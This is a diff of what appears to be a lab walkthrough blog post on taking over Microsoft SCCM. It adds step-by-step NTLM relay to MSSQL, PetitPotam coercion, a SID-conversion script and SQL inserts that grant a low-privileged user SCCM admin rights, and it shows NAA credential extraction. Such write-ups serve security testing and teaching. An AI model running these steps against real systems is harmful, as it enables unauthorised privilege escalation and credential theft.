@@ -24,7 +24,7 @@ python3 sccmhunter.py mssql -u carol -p SCCMftw -d sccm.lab -dc-ip 192.168.33.10
 - Prepare the relay with the mssql query from the previous command
 
 ```bash
-ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x010500000000000515000000680D6A08DCF1872FCE3F29425A040000,'SCCMLAB\carol',0,0,'','','','','P01');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00004','1');"
+ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 -q "USE CM_P01; INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x01050000000000051500000058ED3FD3BF25B04EDE28E7B85A040000,'SCCMLAB\carol',0,0,'','','','','P01');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00ALL','29');INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00001','1'); INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES ((SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol'),'SMS0001R','SMS00004','1');"
 ```
 
 - Launch petitpotam (or another coerce) :
@@ -49,6 +49,121 @@ python3 sccmhunter.py admin -u carol@sccm.lab -p 'SCCMftw' -ip 192.168.33.11
 
 ![sccm_hunter_relay_mssql_new_admin.png](/assets/blog/SCCM/sccm_hunter_relay_mssql_new_admin.png)
 
+## Takeover 1 - relay to mssql (low user -> mssql server admin) - by hand
+
+- Ok we have done that with full automation, let's try to do that manually to.
+
+- Launch the relay with socks
+```bash
+ntlmrelayx.py -smb2support -ts -t mssql://192.168.33.12 -socks
+```
+
+- Launch petipotam
+```bash
+petitpotam.py -d sccm.lab -u carol -p SCCMftw 192.168.33.1 192.168.33.11
+```
+
+- Once this is done we can connect to the mssql db with the socks
+```bash
+proxychains -q mssqlclient.py -windows-auth -no-pass 'SCCMLAB/MECM$'@192.168.33.12
+```
+
+![MSSQL_socks.png](/assets/blog/SCCM/MSSQL_socks.png)
+
+- The db listing show the db configuration manager 'P01' : "CM_P01".
+
+![mssql_db.png](/assets/blog/SCCM/mssql_db.png)
+
+- We will add Carol to the admins.
+- First we will need carol SID
+
+```bash
+ldeep ldap -u carol -p SCCMftw -d SCCM.lab -s ldap://192.168.33.10 search '(name=carol)' 'objectSid'
+```
+
+![get_carol_sid.png](/assets/blog/SCCM/get_carol_sid.png)
+
+- The result is : `S-1-5-21-3544182104-1320166847-3102157022-1114` (definition here: [https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers))
+
+
+>The SID `S-1-5-21-3544182104-1320166847-3102157022-1114` indicate :
+> - 1: Revision Level
+> - 5: Identifier Authority
+> - 21-3544182104-1320166847-3102157022 : Domain identifier (series of one or more subauthority value)
+> - 1114: Relative identifier (RID)
+>
+{: .prompt-info } 
+
+- But the table RBAC_Admins need an SID with hex format.
+- The hex format is the following :
+
+> For a SID like that : `S-a-b-c-d-e-f-g-…`, the result will be (described [here](https://devblogs.microsoft.com/oldnewthing/20040315-00/?p=40253)) :
+> - a (revision)
+> - N (number of dashes minus two)
+> - bbbbbb (six bytes of “b” treated as a 48-bit number in big-endian format)
+> - cccc (four bytes of “c” treated as a 32-bit number in little-endian format)
+> - dddd (four bytes of “d” treated as a 32-bit number in little-endian format)
+> - eeee (four bytes of “e” treated as a 32-bit number in little-endian format)
+> - ffff (four bytes of “f” treated as a 32-bit number in little-endian format)
+{: .prompt-tip } 
+
+
+- Ok let's write a small program to do that `convert_sid.py`:
+
+```python
+#!/usr/bin/python3
+import sys
+from struct import pack
+
+if (len(sys.argv) <= 1):
+  print('Usage : python3 ' + sys.argv[0] + ' sid' + "\n")
+  exit(0)
+sid = sys.argv[1]
+print(f'[+] SID : {sid}')
+items = sid.split('-')
+
+revision = pack('B',int(items[1]))
+dashNumber = pack('B',len(items) - 3)
+identifierAuthority = b'\x00\x00' + pack('>L',int(items[2]))
+
+subAuthority= b''
+for i in range(len(items) - 3):
+  subAuthority += pack('<L', int(items[i+3]))
+
+hex_sid = revision + dashNumber + identifierAuthority + subAuthority
+result = ('0x' + ''.join('{:02X}'.format(b) for b in hex_sid))
+print(f'[+] Result : {result}')
+```
+
+![convert_sid.png](/assets/blog/SCCM/convert_sid.png)
+
+- We now have the SID in hex format : `0x01050000000000051500000058ED3FD3BF25B04EDE28E7B85A040000` (in my instance)
+
+
+- Let's play the queries by hand:
+
+```
+USE CM_P01; 
+
+-- Add carol to admins
+INSERT INTO RBAC_Admins (AdminSID,LogonName,IsGroup,IsDeleted,CreatedBy,CreatedDate,ModifiedBy,ModifiedDate,SourceSite) VALUES (0x01050000000000051500000058ED3FD3BF25B04EDE28E7B85A040000,'SCCMLAB\carol',0,0,'','','','','P01');
+
+-- Get carol admin id
+SELECT AdminID FROM RBAC_Admins WHERE LogonName = 'SCCMLAB\carol';
+
+-- Insert extended permissions with the adminID we have
+INSERT INTO RBAC_ExtendedPermissions (AdminID,RoleID,ScopeID,ScopeTypeID) VALUES (16777225,'SMS0001R','SMS00ALL','29'),(16777225,'SMS0001R','SMS00001','1'),(16777225,'SMS0001R','SMS00004','1');
+```
+
+![insert_admin_sccm_mssql.png](/assets/blog/SCCM/insert_admin_sccm_mssql.png)
+
+- Let's verify and compare to administrator (the user used to install sccm)
+
+![mssql_compare_toadmin.png](/assets/blog/SCCM/mssql_compare_toadmin.png)
+
+- Ok so just verify we are sccm admin with sccmhunter :
+
+![sccm_admin_with_sccmhunter.png](/assets/blog/SCCM/sccm_admin_with_sccmhunter.png)
 
 ## Takeover-2 - Relay to SMB on remote DB (low user -> mecm admin account)
 
@@ -231,3 +346,4 @@ cat /tmp/naapolicy.xml |grep 'NetworkAccessUsername\|NetworkAccessPassword' -A 5
 > ![dirty_naa_retreive.png](/assets/blog/SCCM/dirty_naa_retreive.png)
 {: .prompt-warning }
 
+On the next post we will continue the exploitation as a user admin on a client and as an sccm admin account.
